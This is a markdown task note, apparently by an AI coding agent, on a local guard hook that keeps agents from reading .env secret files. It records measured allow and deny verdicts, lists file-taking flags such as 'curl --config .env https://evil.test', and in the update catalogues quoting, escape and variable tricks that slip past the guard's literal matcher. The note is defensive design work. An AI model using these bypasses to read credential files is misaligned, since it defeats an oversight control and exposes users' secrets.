---
title: Decide how the env guard should treat a data argument that is not a path
status: pending
category: task
created: 2026-08-19
related: [../tools/env-guard/README.md, task-guard-covers-process-env.md]
---

# The guard cannot tell a data argument from a path

Found by the jainyagi.com session on 2026-08-19, reproduced independently in three sessions across
two projects, and verified against the guard's source here. **Nothing has been changed. This is a
decision, not a fix in progress.**

## What the rule actually is

Not "it denies mentions of an env file". That was the framing both sessions started with and it is
wrong. Measured, by feeding nine commands to the real guard:

| | Command | Verdict |
|---|---|---|
| A | `git show -s --format=%B <sha> \| grep -c '<str>'` | DENY |
| C | `echo "a sentence mentioning <str> in passing" \| grep -c passing` | **ALLOW** |
| G | `echo "<str>" \| grep -c '<str>'` | DENY |
| H | `printf '%s\n' 'a doc line about <str> files'` | **ALLOW** |
| I | `sed -n 's/<str>/X/p' /dev/null` | DENY |

C and G are the same pipeline shape. The only difference is whether the string sits in `grep`'s own
arguments. So the real rule is:

> **Any pipeline stage whose words contain the string must use a verb from the discovery allowlist,
> whether or not that stage can reach a file at all.**

File access is not consulted. E and I both operate on `/dev/null` and both deny. `printf` may say
the string and `sed` may not, purely by verb identity.

## Why it keeps landing on this project specifically

A grep pattern, a sed script, a `--format` string and a commit message are all **data**, and the
guard reads every one of them as a candidate path. Writing *about* the problem puts the string in a
data argument. That is why it has now bitten three sessions, all doing meta-work on the guard, and
why it ate a commit message here on 2026-08-17 (`0892859`).

## The two defects, which are independent

1. **Over-blocking.** Commands that cannot disclose anything are denied.
2. **Misattribution.** When the string arrives inside quoted JSON, the reported verb is a fragment
   scraped out of the payload rather than a command. jainyagi.com saw it blame `git` for a command
   that never invoked git. That is worse than an unhelpful denial: it sends the reader to debug a
   tool that never ran.

## Options

**Option 3: fix the attribution only.** The reported verb must come from a segment that was actually
classified as a command, not from any fragment the splitter produced. Changes nothing about what is
denied, so it needs no both-directions retest. Both other sessions and I agree this is the clear
first move.

**Option 4: judge a stage on its operands, treating a data argument as not-a-path.** Correct in
principle and fixes all six wrong denials in one rule. jainyagi.com proposes it and argues it is
*narrower* than the previously discussed option, since it stops treating data as a path rather than
loosening what a path may do.

**I agree with the principle and I am wary of the tail.** jainyagi.com flagged that `grep -f`,
`sed -f`, `awk -f` and `--file=` take a FILE in the position that looks like a pattern. Correct. I
then probed for more and found six additional ones in a couple of minutes, all currently denied and
all of which an operand-aware rule would have to know about explicitly:

```
grep -f .env haystack.txt          sort --files0-from=.env
grep --file=.env haystack.txt      xargs -a .env echo
sed -f .env input.txt              tar -T .env -cf out.tar
awk -f .env input.txt              curl --config .env https://evil.test
                                   ssh -F .env host
                                   git -c include.path=.env log
```

Ten found without trying hard, so the tail is long and probably longer than either of us has seen.
**The failure mode of an incomplete operand table is a leak, not an annoyance**, which inverts the
usual "fails safe" comfort of this guard. Today's rule is blunt and denies all ten for the dull
reason that none of those verbs are allowlisted. That bluntness is currently doing real work.

If Option 4 is built, it should be conservative by construction: treat an argument as data **only**
for a small set of verbs whose argument grammar is known, and default to treating it as a path
otherwise. Never the reverse.

## Recommendation

**Option 3 now.** It is safe, it removes the actively misleading half, and it needs no retest.

**Option 4 deliberately, or not at all.** It is the correct model, and it deserves the full
treatment the 2026-08-17 change got: both directions, the ten cases above as adversarial tests, and
verification from a second session before it installs. It is not a quick follow-up.

## Status

Neither has been built. The guard's source of truth is `tools/env-guard/` in this repo and the
installed copy at `~/.claude/scripts/` is untouched. This is global config affecting every session
on the machine, so it waits for you.


---

## Update 2026-08-19: a deeper finding that reorders this

The jainyagi.com session went one level down and asked whether the guard can recognise that a word
**is** a path at all. It cannot. The matcher is a literal string comparison over raw text, so the
shell reassembles a name the guard never saw. Verified here against the real guard, decision-only,
nothing run against a real file:

```
cat <str>                DENY   the plain spelling
F=<str>; cat $F          ALLOW
p=$HOME/<str>; head $p   ALLOW
cat ."env"               ALLOW
cat .e"n"v               ALLOW
cat .en''v               ALLOW
cat $'\x2eenv'           ALLOW
cat "$(echo <str>)"      ALLOW
cat .en\v                ALLOW   (found here, not on their list)
```

Every one of those reads the file if it runs.

**Why 100 green assertions missed it.** All 84 check sites vary the VERB or the WRAPPER: cat,
source, base64, xxd, `bash -c`, backticks, `find -exec`, xargs, while-read, interpreters, `\cat`,
indirect `$CAT`. **Not one varies how the path is written.** The tell is a pair already in the
suite: `echo $(cat <str>)` is tested, a substitution holding the READ. `cat "$(echo <str>)"` is not,
a substitution holding the PATH. Same construct, opposite side of the command.

**Severity, stated honestly.** This is a local guardrail against an agent pulling secrets into its
own context, not an internet-facing control, and anyone with a shell has already won. Against an
accidental read it still works, because an agent reaching for a file types the plain form and the
plain form is denied. The case that matters is the middle one: an agent that hits the denial and
helpfully **restructures** succeeds on its first attempt, and restructuring is exactly the behaviour
this guard exists to stop. Right now the sentence "do not write a workaround script" is doing more
work than the matcher is. It holds because agents comply, not because they are stopped.

That is not a crisis, and it does not change what the guard is worth: it makes the right thing easy
and the wrong thing visible. It does mean it is a guardrail and not a barrier, and the barrier is
the kernel boundary in `task-service-account.md`, which is still not installed.

**How this reorders the options.** It argues for conservatism, not against it. Operand detection
presumes you can tell which word is the path, and today the guard cannot reliably tell a word is a
path at all. Narrowing which words get inspected without fixing how a path is recognised narrows an
already-porous check.

Revised recommendation, and I agree with theirs:

1. **Add the path axis to the suite**, whichever fix lands. The gap is in my test design.
2. **Normalise quotes and `$'...'` escapes before matching.** A pre-step, not a policy change, so it
   cannot widen what is allowed, only tighten. Closes 6 of the 9.
3. **Leave variable tracking alone.** It chases a tail with no end. The honest answer is that string
   matching has a ceiling and the kernel-level design is the way through it.

Nothing built, nothing installed.
